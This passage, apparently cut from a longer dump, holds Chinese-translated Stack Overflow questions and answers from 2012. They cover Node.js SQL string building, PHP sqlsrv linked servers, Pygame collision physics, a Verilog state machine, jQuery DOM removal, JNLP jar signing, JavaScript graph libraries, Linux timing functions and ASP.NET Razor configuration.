var ids = Object.keys(answer['matches']).join(",");
var sql = "SELECT * FROM xml_it WHERE id IN (" + ids + ")"; 
```

现在，如果我回显 PHP $sql 变量，我会得到预期的结果：

```
SELECT * FROM table WHERE id IN (3187,3220,3233,3245,3246,3251,3253,3256, ... 
```

但是，使用 node.js，我得到了这个：

```
SELECT * FROM xml_it WHERE id_xml IN ([0,1,2,3,4, ... 
```

answer['matches'] 显然是相同的结果（它基本上是 Sphinx 搜索结果）

知道为什么我没有将它作为字符串而是键吗？

$result 和 var answer 的数据如下所示：

```
[{"doc":3187,"weight":1,"attrs":{}},{"doc":3220,"weight":1,"attrs":{}},{"doc":3233,"weight":1,"attrs":{}}, 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T16:12:52.400

这应该有效：

```
var matches = answer['matches'].map( function( o ) {
  return o.doc;
});
var ids = matches.join(",");
var sql = "SELECT * FROM xml_it WHERE id IN (" + ids + ")"; 
```

由于结构不同，因此必须绘制 doc 字段

# php - 带有链接服务器的 SQLSRV

> ID：12392262
> 
> 赞同：0
> 
> 时间：2012-09-12T16:05:01.813
> 
> 标签：php, sql-server

我的问题基本上围绕着我需要/更喜欢使用 PHP 的 sqlsrv 来访问 sql-server 2000 数据库。我已经在使用 sql server 2005 运行所有查询并切换到类似 ODBC PHP 驱动程序之类的东西的项目上工作，现在将是一个非常令人头疼的问题。因此，现在我将原始 SQL Server 2000 数据库和 2005 安装在同一台计算机上，并在两者之间创建了一个链接服务器。在 Management Studio Express 中对其进行测试，只需对其中一个表运行一个简单的查询即可。

现在，我在 PHP 中使用 sqlsrv_query 使用完全相同的查询并遇到错误。我测试这个的 PHP 代码看起来像这样

```
$connectionOptions = array("UID"=>"user","PWD"=>"password"); 
$res = sqlsrv_connect("(local)\SQLExpress", $connectionOptions);
if(!$res) die("ERRORS : " . print_r(sqlsrv_errors()));    
echo "SELECT * FROM [ServerName].DB.dbo.Table<br/>";
$res = sqlsrv_query($res,"SELECT * FROM [ServerName].DB.dbo.Table");

if($res===false){
    die("ERRORS : " . print_r(sqlsrv_errors()));
}else{
        var_dump($res);
    $ary = sqlsrv_fetch_array($res);
} 

var_dump($ary);

echo "<hr>";
var_dump(sqlsrv_errors()); 
```

这段代码的问题是 sqlsrv_query 的结果不返回 false 而是返回类型未知的资源（11）。所以在该结果上运行 fetch_array 告诉我一个无效的参数被传递给了 sqlsrv_fetch_array。我不确定此时该怎么做。通过 sqlsrv 在链接服务器上运行查询是否存在问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T17:05:23.957

您的代码中似乎没有错误。

请在循环中尝试 fetch_array 并更新结果。

```
while($row = sqlsrv_fetch_array($result))
{
    echo($row['field_name']);
} 
```

也删除`var_dump($ary);`

通常即使使用'$row' 的数据显示有任何错误，错误消息也会显示'sqlsrv_fetch_array' 的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T17:35:54.160

好吧，我发现了问题所在。在我匆忙编写一些代码来测试链接服务器是否工作时，我只是为 sqlsrv_connect 和 sqlsrv_query 的结果使用了相同的变量名。事实证明，这就是整个问题。我切换了变量名称，以便连接对象为 $Link，查询保持为 $res。现在，我可以访问我试图从 2005 年到 2000 年的数据库。所以在未来，我肯定会更仔细地命名我的变量，这样我就不会在几个小时内碰壁。

# python - Python/Pygame 中的弹性碰撞

> ID：12392263
> 
> 赞同：3
> 
> 时间：2012-09-12T16:05:04.133
> 
> 标签：python, pygame, physics

我在处理引力场中的弹性碰撞时遇到了一个严重的问题。我试图按照能量守恒定律来实现这一点，但它出错了，[如本视频所示](http://www.youtube.com/watch?v=OF7B4H83Kv4)。首先，两个物体粘在一起，碰撞后几百帧，它们达到了巨大的速度。

完整的[代码在这里在线](http://ubuntuone.com/0A2uIt56dopFrffklotLxE)，但是负责在碰撞后给出输出速度的方法是这个函数来自`world.py`：

```
def collision(self, obj1, obj2):
    R = obj1.radius + obj2.radius   # code is used to "jump back in time" to avoid penetration when there's a collision
    dx = obj1.x - obj2.x            #
    dy = obj1.y - obj2.y            #
    K = math.hypot(dx, dy)          #   
    dvx = obj1.vx - obj2.vx         #   
    dvy = obj1.vy - obj2.vy         #
    dv = math.hypot(dvx, dvy)       #
    deltat = (R - K)/dv             #
    print dv
    print deltat
    obj1.x = obj1.rect.centerx = obj1.x - obj1.vx # *deltat
    obj2.x = obj2.rect.centerx = obj2.x - obj2.vx # *deltat
    obj1.y = obj1.rect.centery = obj1.y - obj1.vy # *deltat
    obj2.y = obj2.rect.centery = obj2.y - obj2.vy # *deltat
    dx = obj2.x - obj1.x
    dy = obj2.y - obj1.x
    delta = math.hypot(dx, dy)
    nx = dx/delta
    ny = dy/delta
    vx1bc = obj1.vx * nx
    vx2bc = obj2.vx * nx
    vy1bc = obj1.vy * ny
    vy2bc = obj2.vy * ny
    vx2ac = (obj2["energy_loss"]*(vx1bc - vx2bc) + vx1bc + (obj2["mass"]/obj1["mass"]*vx2bc))/((obj2["mass"]/obj1["mass"])+1)
    vy2ac = (obj2["energy_loss"]*(vy1bc - vy2bc) + vy1bc + (obj2["mass"]/obj1["mass"]*vy2bc))/((obj2["mass"]/obj1["mass"])+1)
    vx1ac = (vx1bc + obj2["mass"]/obj1["mass"]*vx2bc - obj2["mass"]/obj1["mass"]*vx2ac)*obj1["energy_loss"]
    vy1ac = (vy1bc + obj2["mass"]/obj1["mass"]*vy2bc - obj2["mass"]/obj1["mass"]*vy2ac)*obj1["energy_loss"]
    V1cx = obj1.vx * ny
    V1cy = obj1.vy * ny
    V2cx = obj2.vx * ny
    V2cy = obj2.vy * ny
    alfa = math.atan2(ny, nx)
    alfa_deg = math.degrees(alfa)
    v1a = math.hypot(vx1ac, vy1ac)
    v2a = math.hypot(vx2ac, vy2ac)
    obj1.vx = v1a*math.cos(alfa)+V1cx * math.sin(alfa)
    obj2.vx = v2a*math.cos(alfa)+V2cx * math.sin(alfa)
    obj1.vy = v1a*math.sin(alfa)+V1cx * math.cos(alfa)
    obj2.vy = v2a*math.sin(alfa)+V2cx * math.cos(alfa) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-15T07:30:23.607

您的代码使用了许多不同的变量，而且它们的名称也不那么相关。这使得很难跟上所有的东西，也很难让其他人看到你的程序做了什么。也许您应该将变量附加到列表并访问它们？另外我建议你看看一个很棒的物理教程： [http ://www.petercollingridge.co.uk/pygame-physics-simulation](http://www.petercollingridge.co.uk/pygame-physics-simulation)

# verilog - 有限状态机verilog

> ID：12392265
> 
> 赞同：-2
> 
> 时间：2012-09-12T16:05:15.870
> 
> 标签：verilog, fsm

我想知道是否有人可以阐明如何在 Verilog 中编码一个模式 fsm，该模式在 8 个 LED 上产生 4 种不同的模式，并且 LED 会改变每个滴答脉冲。我知道我应该使用状态寄存器和组合下一个状态逻辑，但我不确定如何编写它。

我希望有人可以提供一个例子。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T17:25:21.413

如果不了解每个细节，很难提供示例……但最简单的情况可能看起来像具有四个状态和异步复位的状态机。状态在时钟的每个上升沿都会发生变化。对于每个状态，7 位数据被“驱动”到 LED（您可以将其扩展到 8 个 LED 没问题，只需更多输入）：

```
module fsm_example(clk, reset_n, data);

   input wire clk;     // Clock input
   input wire reset_n; // Asynchronous reset (active low)
   output reg [6:0] data; // Data driven to seven-segment display...

   // Constant state enumeration
   localparam STATE_0 = 2'd0;
   localparam STATE_1 = 2'd1;
   localparam STATE_2 = 2'd2;
   localparam STATE_3 = 2'd3;

   // Current FSM state (up to 2 bits, enough to hold values from 0 to 3)
   reg [1:0] state;

   // Clock-driven state machine. Changes state on every
   // raising edge of the clock.
   always @ (posedge clk or negedge reset_n) begin
      if (!reset_n) begin
         state <= STATE_0;
      end else begin
         case (state)
           STATE_0: state <= STATE_1;
           STATE_1: state <= STATE_2;
           STATE_2: state <= STATE_3;
           STATE_3: state <= STATE_0;
         endcase
      end
   end

   // State to output data mapping.
   always @ (state) begin
      case (state)
        STATE_0: data = 7'b0111111; // 0x0
        STATE_1: data = 7'b0000110; // 0x1
        STATE_2: data = 7'b1011011; // 0x2
        STATE_3: data = 7'b1001111; // 0x3
      endcase
   end

endmodule 
```

如果您了解一点 Verilog，则代码非常简单。希望能帮助到你。

# jquery - 在jquery中的某个位置之后删除所有容器

> ID：12392268
> 
> 赞同：1
> 
> 时间：2012-09-12T16:05:22.557
> 
> 标签：jquery

我有一个根据对问题的回答添加 div 容器的过程。用户可以选择在任何时候重新开始。当用户执行此操作时，我想在某个时间点后删除所有容器。例如，这是您在 3 次响应后会看到的内容。

```
<div id="SolutionAdvisor">
    <div id="Col1"><div class="content">some content here</div></div>
    <div id="Col2"><div class="content">some content here</div></div>
    <div id="Col3"><div class="content">some content here</div></div> 
 </div> 
```

如果用户决定回到问题 2，我希望看到：

```
 <div id="SolutionAdvisor">
    <div id="Col1"><div class="content">some content here</div></div>
    <div id="Col2"><div class="content">some content here</div></div> 
 </div> 
```

我尝试过像这样使用 :gt 索引：

```
 $('#SolutionAdvisor div:gt('+column+')').remove(); 
```

也试过：

```
 $('#SolutionAdvisor div:gt('+column+')').each(function(){$(this).remove();}); 
```

其中列将是 1。

我看到的是这样的：

```
 <div id="SolutionAdvisor">
    <div id="Col1"><div class="content">some content here</div></div>
    <div id="Col2"><div class="content">some content here</div></div>
    <div id="Col2"><div class="content">some content here</div></div> 
 </div> 
```

这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:16:49.980

您可以从父 div 获取子列表作为 html 元素数组。然后，将每一个包装在一个 jQuery 调用中并按如下方式删除它们：

```
var maxQuestions = 2;

 children = $('#SolutionAdvisor').children();
 for (var i = maxQuestions; i < children.length; i++) {
     $(children[i]).remove();
 } 
```

小提琴：http: [//jsfiddle.net/stevenmtwhunt/YQusg/2/](http://jsfiddle.net/stevenmtwhunt/YQusg/2/)

使用 jQuery 选择器也有一些很酷的方法，我只是喜欢 for 循环的概念简单性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:09:42.623

您应该使用直接后代选择器，例如：

```
$('#SolutionAdvisor > div:gt(?)).remove(): 
```

另请注意，传递给的值`gt()`是零索引的。

此外，您可能希望对这些 div 进行分类，以便您可以直接访问它们，例如：

```
$('.responses:gt(?)').remove(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T16:17:42.510

这是使用 .nextAll() 方法捕获输入值之后的所有元素的最佳方案。

```
$('#txt1').on('change' , function() {
        var quesNo = $(this).val();    
        $('#SolutionAdvisor div:nth-child('+quesNo+')').nextAll().remove();        
    }); 
```

在这里检查[FIDDLE](http://jsfiddle.net/sushanth009/BAuJs/)

# java - Web 启动异常 JNLP

> ID：12392271
> 
> 赞同：1
> 
> 时间：2012-09-12T16:05:28.140
> 
> 标签：java, deployment, jnlp, java-web-start

所以我对如何签署一个 jar 以使其作为 jnlp 运行有点困惑。

目前我有一个jar，它运行，开始下载并验证东西，然后它到最后并弹出一个窗口说它无法启动，然后它给出了异常：

```
JNLPException[category: Launch File Error : Exception: null : LaunchDesc: 
 <jnlp codebase="http:/SomeHost:8080/_test/" href="jnlpcomponent1.jnlp" spec="1.0+">
<information>
  <title>jnlpcomponent1</title>
 <vendor>SUN_MICR</vendor>
 </information>
 <security>
 <all-permissions/>
  </security>
<resources>
 <jar href="lib/activation.jar" download="eager"/>
<jar href="lib/mail.jar" download="eager"/>
 </resources>
 <component-desc/>
 </jnlp> 
]
at com.sun.javaws.security.JNLPSignedResourcesHelper.checkSignedResourcesHelper(Unknown Source)
at com.sun.javaws.security.JNLPSignedResourcesHelper.checkSignedResources(Unknown Source)
at com.sun.javaws.Launcher.prepareResources(Unknown Source)
at com.sun.javaws.Launcher.prepareAllResources(Unknown Source)
at com.sun.javaws.Launcher.prepareToLaunch(Unknown Source)
at com.sun.javaws.Launcher.prepareToLaunch(Unknown Source)
at com.sun.javaws.Launcher.launch(Unknown Source)
at com.sun.javaws.Main.launchApp(Unknown Source)
at com.sun.javaws.Main.continueInSecureThread(Unknown Source)
at com.sun.javaws.Main$1.run(Unknown Source)
at java.lang.Thread.run(Unknown Source) 
```

我相当确定这与 jar 被错误/错误地签名有关......我可以使用一些帮助来理解这里发生了什么以及如何修复它。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-12T16:09:20.697

> 我相当确定这与 jar 被错误/错误地签名有关

正是这种情况，你的一个罐子没有签名（正确）

什么总是对我有用：解压缩所有罐子而不是用 1 个进程签名。如果确认它可以正常工作，那么我将移除 1-2 个 jar 以匹配原始部署设计。而且你会知道问题出在什么罐子里，而不是更容易修复它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-21T18:40:45.820

您可以使用 ANT 对 JAR 文件进行签名。通过这种方式，您可以在 IDE 中对文件进行签名，并为部署应用程序提供更快的工作流程。每次更改都需要您重新签署您的应用程序。

```
<project name="YourProject" default="dist" basedir="jarsigning">

  <target name="signMainJar">
     <signjar jar="../dist/YourApp.jar" destDir="signed" alias="WhateverYouSetIt2" 
              keystore="fileNameOfCerticate" storepass="passw03d" lazy="true" /> 
     <echo message="The file was signed." /> 
  </target>
  <!-- Use this if you are using any libraries. These also need to be signed. -->
  <target name="signLibs">
    <signjar destDir="signed" alias="WhateverYouSetIt2"
              keystore="fileNameOfCerticate" storepass="passw03d" force="true">
       <path>
          <fileset dir="lib" includes="*.jar" /> 
       </path>
    </signjar>
    <echo message="The library files were signed." /> 
  </target>

 </project> 
```

在运行此脚本之前，您需要先创建一个 jarsigning 目录并放置一个用于签名的证书（密钥）。在该文件夹中，创建一个名为“已签名”的文件夹，这是脚本将放置已签名代码的位置。如果您尚未从 Verisign 或 GoDaddy 等授权机构购买自签名证书，请使用[密钥库工具创建自签名证书。](http://docs.oracle.com/javase/1.5.0/docs/tooldocs/solaris/keytool.html)

# javascript - 使用 SVG / Raphael 动态更新一行

> ID：12392274
> 
> 赞同：0
> 
> 时间：2012-09-12T16:05:39.217
> 
> 标签：javascript, jquery, animation, svg, raphael

我最终想要做的是让一个圆圈遵循由服务器实时更新的路径。将其视为沿线的目标。[多亏了这个小提琴](http://jsfiddle.net/gyeSf/17/)，我已经知道如何使圆圈沿着路径前进。但是我的问题来自如何动态更新圆的线和路线，因为最终我希望目标跟踪服务器生成的数据，但我不知道该怎么做。

为了便于测试，我创建了一个[jsFiddle](http://jsfiddle.net/yTmMz/2/)，允许您在屏幕上单击以放置一个点，目的是模拟服务器数据。然后，当您单击它时，圆圈应该依次向每个点移动。

那么如何更新现有路径并使动画无缝继续，而不影响路径的先前部分？

# javascript - Javascript库动态创建图表？

> ID：12392275
> 
> 赞同：5
> 
> 时间：2012-09-12T16:05:40.227
> 
> 标签：javascript, graph, d3.js, jsplumb, arbor.js

这是我的要求：

我需要创建一个人的不同表示之间的链接的可视化。我认为下面的图像相当清楚地表明了这一点。

![在此处输入图像描述](../Images/144ba38b14bca934aa1184e6f5cab87b.png)

此外，这些矩形还将包含一些关于该人的表示的数据（例如人口统计和地点）。我还需要能够在单击框或它们之间的链接时处理事件，作为一种管理工具（例如，双击链接以删除它，或类似的东西）。同样重要的是，由于人员和链接的数量会有所不同，因此我需要通过以大致等距的方式将人员隔开，如图所示。

什么是可以实现此目的的 javascript 库？我已经做了一些研究，但还没有找到可以干净地做到这一点的东西，但我几乎不是这些图书馆的专家。

**以下是我看过的：**

[Arbor js](http://arborjs.org/)：可以动态创建图形的间距和链接，但我负责渲染所有视觉效果，并且对于单击链接之类的事情真的没有钩子。

[jsPlumb](http://jsplumbtoolkit.com/jquery/demo.html)：轻松创建元素之间的连接并很好地绘制它们，但似乎没有解决任何布局问题。因为我不知道屏幕上会有多少人，所以我必须能够将他们等距隔开，这似乎不是 jsPlumb 关心的问题。

[D3.js](http://d3js.org/)：这可以创建具有我需要的间距的良好可视化，但我看不到如何在每个节点内显示数据或执行诸如链接或框上的鼠标事件之类的操作。

我感到有点失落，所以我希望有人能指出一些可以帮助我的东西，或者可能指出我从这些库中的一个例子中可以看到我想要的东西是可能的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-13T20:48:39.800

我最终使用带有 Raphael 的 Arbor 作为我的渲染库，效果非常好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-18T14:39:02.657

看看[Dracula Graph Library](http://www.graphdracula.net/)。这是一个简单的库，似乎既可以进行布局又可以渲染图形（在引擎盖下使用 Raphael）。然而，它有点不发达。

# c - 在 Linux 中测量时间 - 时间 vs 时钟 vs getrusage vs clock_gettime vs gettimeofday vs timespec_get？

> ID：12392278
> 
> 赞同：163
> 
> 时间：2012-09-12T16:05:49.287
> 
> 标签：c, linux, time, linux-kernel

在计时函数中，`time`、`clock` `getrusage`、`clock_gettime`和`gettimeofday`，`timespec_get`我想清楚地了解它们是如何实现的以及它们的返回值是什么，以便知道我必须在什么情况下使用它们。

首先，我们需要将返回**挂钟值**的函数与返回**进程或线程值**的函数进行比较。`gettimeofday`返回挂钟值，根据传递给它的参数`clock_gettime`返回挂钟值**或进程或线程值。**并返回过程值。`Clock``getrusage``clock`

然后第二个问题是关于这些功能的实现以及它们的准确性。这些功能使用哪种硬件或软件机制。

似乎`getrusage`只使用内核刻度（通常为 1ms 长），因此不能比 ms 更准确。这样对吗？然后该`getimeofday`功能似乎使用了最准确的底层硬件。因此，在最近的硬件上，它的精度通常是微秒（由于 API 的原因不能更高）。怎么样`clock`，手册页谈到“近似”，这是什么意思？那么`clock_gettime`，API 是纳秒级的，是否意味着如果底层硬件允许它能够如此精确呢？单调性呢？

还有其他功能吗？

* * *

## 回答 #1

> 赞同：211
> 
> 时间：2012-09-18T15:45:58.677

问题是 C 和 C++ 中有几个不同的时间函数可用，其中一些函数在实现之间的行为不同。还有很多半答案。编译时钟函数列表及其属性将正确回答这个问题。首先，让我们问一下我们正在寻找的相关属性是什么。看了你的帖子，建议：

*   时钟测量的是什么时间？（真实的，用户，系统，或者，希望不是，挂钟？）
*   时钟的精度是多少？（秒、毫秒、微秒还是更快？）
*   时钟经过多少时间？或者有什么机制可以避免这种情况？
*   时钟是单调的，还是会随着系统时间的变化而变化（通过 NTP、时区、夏令时、用户等）？
*   上述内容在实现之间有何不同？
*   具体功能是否过时、不规范等？

在开始列表之前，我想指出挂钟时间很少是正确使用的时间，而它会随着时区变化、夏令时变化或挂钟是否由 NTP 同步而变化。如果您使用时间来安排事件或对性能进行基准测试，那么这些都不是好事。它只顾名思义，墙上（或桌面）上的时钟。

以下是我目前在 Linux 和 OS X 中发现的时钟：

*   [`time()`](http://linux.die.net/man/2/time)从操作系统返回挂钟时间，精度以秒为单位。
*   [`clock()`](http://linux.die.net/man/3/clock)似乎返回用户和系统时间的总和。它存在于 C89 及更高版本中。曾经这应该是 CPU 时间周期，但[像 POSIX 这样](http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/time.h.html)的现代标准要求 CLOCKS_PER_SEC 为 1000000，最大可能精度为 1 µs。我的系统上的精度确实是 1 µs。这个时钟一旦达到顶峰就会回绕（这通常发生在 ~2^32 个滴答声之后，这对于 1 MHz 时钟来说不是很长）。`man clock`说从 glibc 2.18 开始，它是`clock_gettime(CLOCK_PROCESS_CPUTIME_ID, ...)`在 Linux 中实现的。
*   [`clock_gettime(CLOCK_MONOTONIC, ...)`](http://linux.die.net/man/3/clock_gettime)提供纳秒级分辨率，是单调的。我相信“秒”和“纳秒”是分开存储的，每个都存储在 32 位计数器中。因此，任何回绕都会在数十年的正常运行时间之后发生。这看起来是一个非常好的时钟，但不幸的是它在 OS X 上还不可用。POSIX 7[描述`CLOCK_MONOTONIC`为一个可选扩展](http://pubs.opengroup.org/onlinepubs/9699919799/functions/clock_getres.html)。
*   [`getrusage()`](http://linux.die.net/man/2/getrusage)原来是我的情况的最佳选择。它分别报告用户和系统时间并且不回绕。我的系统上的精度为 1 µs，但我也在 Linux 系统（带有 GCC 4.1.2 的 Red Hat 4.1.2-48）上对其进行了测试，精度仅为 1 ms。
*   [`gettimeofday()`](http://linux.die.net/man/2/gettimeofday)以（名义上）微秒精度返回挂钟时间。在我的系统上，这个时钟似乎具有 µs 精度，但这不能保证，因为[“系统时钟的分辨率取决于硬件”](http://linux.die.net/man/2/gettimeofday)。POSIX.1-2008[说](http://pubs.opengroup.org/onlinepubs/9699919799/functions/gettimeofday.html)。“应用程序应该使用`clock_gettime()`函数而不是过时的`gettimeofday()`函数”，所以你应该远离它。Linux x86 并将其实现[为系统调用](https://github.com/torvalds/linux/blob/v4.4/arch/x86/entry/syscalls/syscall_64.tbl#L105)。
*   [`mach_absolute_time()`](https://developer.apple.com/library/mac/#qa/qa1398/_index.html)是 OS X 上非常高分辨率 (ns) 计时的一个选项。在我的系统上，这确实提供了 ns 分辨率。原则上，这个时钟环绕，但是它使用 64 位无符号整数存储 ns，因此环绕在实践中不应该成为问题。便携性值得怀疑。
*   我基于[这个片段](https://gist.github.com/jbenet/1087739)[编写了一个混合函数](https://stackoverflow.com/questions/21665641/ns-precision-monotonic-clock-in-c-on-linux-and-os-x/21665642#21665642)，在 Linux 上编译时使用 clock_gettime，在 OS X 上编译时使用 Mach 计时器，以便在 Linux 和 OS X 上获得 ns 精度。

除非另有说明，否则上述所有内容都存在于 Linux 和 OS X 中。上面的“我的系统”是运行 OS X 10.8.3 和 MacPorts 的 GCC 4.7.2 的 Apple。

最后，除了上面的链接之外，这里是我发现有用的参考列表：

*   [http://blog.habets.pp.se/2010/09/gettimeofday-should-never-be-used-to-measure-time](http://blog.habets.pp.se/2010/09/gettimeofday-should-never-be-used-to-measure-time)
*   [如何测量 Linux 下 C 程序的实际执行时间？](https://stackoverflow.com/questions/7215764/how-to-measure-the-actual-execution-time-of-a-c-program-under-linux)
*   [http://digitalsandwich.com/archives/27-benchmarking-misconceptions-microtime-vs-getrusage.html](http://digitalsandwich.com/archives/27-benchmarking-misconceptions-microtime-vs-getrusage.html)
*   [http://www.unix.com/hp-ux/38937-getrusage.html](http://www.unix.com/hp-ux/38937-getrusage.html)

* * *

**更新**：对于 OS X，`clock_gettime`已从 10.12 (Sierra) 开始实施。此外，基于 POSIX 和 BSD 的平台（如 OS X）共享`rusage.ru_utime`struct 字段。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2016-04-18T17:14:12.753

**C11`timespec_get`**

用法示例：[https ://stackoverflow.com/a/36095407/895245](https://stackoverflow.com/a/36095407/895245)

返回的最大可能精度为纳秒，但实际精度是实现定义的，可能更小。

它返回挂墙时间，而不是 CPU 使用率。

glibc 2.21 在下面实现它[`sysdeps/posix/timespec_get.c`](https://sourceware.org/git/?p=glibc.git;a=blob;f=sysdeps/posix/timespec_get.c;h=2609b2e72998aacc4ea537430c2278ebbf51b83a;hb=4e42b5b8f89f0e288e68be7ad70f9525aebc2cff)并直接转发到：

```
clock_gettime (CLOCK_REALTIME, ts) < 0) 
```

`clock_gettime`并且`CLOCK_REALTIME`是 POSIX [http://pubs.opengroup.org/onlinepubs/9699919799/functions/clock_getres.html](http://pubs.opengroup.org/onlinepubs/9699919799/functions/clock_getres.html)，并`man clock_gettime`表示如果您在程序运行时更改某些系统时间设置，此度量可能会出现不连续性。

**C++11 计时码表**

既然我们在这里，让我们也介绍一下：[http ://en.cppreference.com/w/cpp/chrono](http://en.cppreference.com/w/cpp/chrono)

GCC 5.3.0（C++ 标准库在 GCC 源代码中）：

*   [`high_resolution_clock`](https://github.com/gcc-mirror/gcc/blob/2bc376d60753a58b10cb179f8edb7d72bee7a88b/libstdc%2B%2B-v3/include/std/chrono#L776)是一个别名`system_clock`
*   [`system_clock`](https://github.com/gcc-mirror/gcc/blob/2bc376d60753a58b10cb179f8edb7d72bee7a88b/libstdc++-v3/src/c++11/chrono.cc#L54)转发到以下可用的第一个：
    *   `clock_gettime(CLOCK_REALTIME, ...)`
    *   `gettimeofday`
    *   `time`
*   [`steady_clock`](https://github.com/gcc-mirror/gcc/blob/2bc376d60753a58b10cb179f8edb7d72bee7a88b/libstdc++-v3/src/c++11/chrono.cc#L82)转发到以下可用的第一个：
    *   `clock_gettime(CLOCK_MONOTONIC, ...)`
    *   `system_clock`

提问：[std::system_clock 和 std::steady_clock 的区别？](https://stackoverflow.com/questions/13263277/difference-between-stdsystem-clock-and-stdsteady-clock)

`CLOCK_REALTIME`vs `CLOCK_MONOTONIC`: [CLOCK_REALTIME 和 CLOCK_MONOTONIC 的区别？](https://stackoverflow.com/questions/3523442/difference-between-clock-realtime-and-clock-monotonic)

# jquery - HTML5 中的移动测验应用程序？

> ID：12392279
> 
> 赞同：4
> 
> 时间：2012-09-12T16:05:51.630
> 
> 标签：jquery, html, mobile

我想创建一个有测验的移动应用程序。测验将从网络服务器中提取信息，以便可以更新测验。这可以仅在 HTML5 和 jQuery 中完成吗？如果是这样，你有什么推荐的吗？我搞不清楚了。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T17:06:53.937

如前所述，您将需要一些服务器端基础设施来从您的移动 Web 应用程序进行 AJAX 调用，以检索问题并存储结果等（如果需要）。

对于您想做的事情，HTML5 和 jQueryMobile 非常适合这项任务。

有关使用基本 HTML5 Canvas 内容在 HTML5 中创建拼图/测验的一些简单教程，这里有一些链接：

*   [http://www.flashbynight.com/tutes/html5quiz/](http://www.flashbynight.com/tutes/html5quiz/)
*   [http://rhuno.com/flashblog/2012/08/01/tutorial-puzzle-game-basics-with-html5-and-javascript/](http://rhuno.com/flashblog/2012/08/01/tutorial-puzzle-game-basics-with-html5-and-javascript/)

# jquery - 自定义图像滑块问题（图像撞到新行）

> ID：12392282
> 
> 赞同：1
> 
> 时间：2012-09-12T16:05:56.513
> 
> 标签：jquery, html, css, overflow, slide

我在使用 JQuery 将图像滑入视图时遇到问题。基本上，滑入视图工作正常（使用.animate），但应该被推出视图（从左到右）的图像实际上只是被撞倒了。这是我的代码：

```
var new_id = $(img).attr("id") - 1;
var src_tag = document.getElementById(new_id);
var src = "img/large/" + $(src_tag).attr("src").replace(/^.*[\\\/]/, '');
var img_tag = "<img src=\"" +  src  + "\" id=\"" + new_id + "\" 
                style=\"display:inline; position: relative; left:-944px; \" />";

$('#insert-image').prepend(img_tag);
$(img[0]).animate({left: '+=944px'}, 'fast'); 
```

和我的html：

```
<div id="insert-image-wrapper">
    <div id="insert-image" class="main-content">
        <img src="img/large/colour-version.png" id="4" style="display:inline;">
    </div>
</div> 
```

和我的CSS：

```
div.main-content{
    width: 944px;
    margin-left:auto;
    margin-right:auto;
}

#insert-image-wrapper{
    width:100%; 
    background-color:#C0C0C0;
}

#insert-image{
    width:944px;
    height:518px;
    overflow: hidden;
    display:none;
} 
```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-12T19:30:15.283

这未经测试，但可能会有所帮助：
将 css 更改为：

```
#insert-image-wrapper{
    width:945px; 
    background-color:#C0C0C0;
    overflow-x:hidden;
}
div.main-content{
    margin:0 auto;
}
div.main-content img{
    float:left;
    display:inline;
    width: 944px;
}
#insert-image{
    width:2000px;
    height:518px;
    display:none;
} 
```

# asp.net-mvc - 如何避免在每个页面中使用@using

> ID：12392287
> 
> 赞同：1
> 
> 时间：2012-09-12T16:06:06.463
> 
> 标签：asp.net-mvc, web-config

我想知道是否有任何方法可以避免在每个页面中使用关键字@using 来导入一些代码。

一个例子：我想`@Styles.Render("~/js/jquery-ui")`在某些页面中使用，我不想手动编写`@using System.Web.Optimization`.

我在博客中看到可以在`<page>`in 中添加命名空间`web.config`，但是我尝试了这个但它不起作用。

有什么办法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-12T16:07:02.447

您可以将其添加到`~/Views/web.config`（非`~/web.config`）文件的命名空间部分：

```
 <system.web.webPages.razor>
    <host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    <pages pageBaseType="System.Web.Mvc.WebViewPage">
      <namespaces>
        <add namespace="System.Web.Mvc" />
        <add namespace="System.Web.Mvc.Ajax" />
        <add namespace="System.Web.Mvc.Html" />
        <add namespace="System.Web.Routing" />

        ... add other namespaces that you want to be available in scope
            in all your Razor views
      </namespaces>
    </pages>
  </system.web.webPages.razor> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-12T16:07:11.657

将其添加到元素下*Views*文件夹中的 web.config 中。`system.web.webPages.razor`

```
<system.web.webPages.razor>
  <pages pageBaseType="System.Web.Mvc.WebViewPage">
    <namespaces>
      <add namespace="System.Web.Optimization.Styles" />
    </namespaces>
  </pages>
</system.web.webPages.razor> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T16:08:19.457

您应该能够在 web.config 中添加全局命名空间，如此[处](https://stackoverflow.com/questions/4136703/razor-htmlhelper-extensions-not-found/4136773#4136773)所述。

# vb6 - 如何安装应用程序的 OCX 组件？

> ID：12392288
> 
> 赞同：1
> 
> 时间：2012-09-12T16:06:22.120
> 
> 标签：vb6

我在 App 服务器上复制了一些组件，以便可以运行 VB6 应用程序

```
TABCTL32.OCX
TABCTL32.DEP
MSWINSCK.DEP
MSWINSCK.OCX
MSMAPI32.DEP
MSMAPI32.OCX
FTP.OCA
FTP.OCX
COMDLG32.OCX 
```

我从这里另一个问题的答案中得到了一些建议。任何人都可以建议这样做是否安全。此服务器上还安装了一个 ASP.NET 应用程序（框架版本 3.5）。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T17:33:10.090

以“.OCX”扩展名结尾的文件实际上是 32 位进程内 COM DLL，必须注册才能使用它们。这是通过命令行“regsvr32”实用程序完成的。

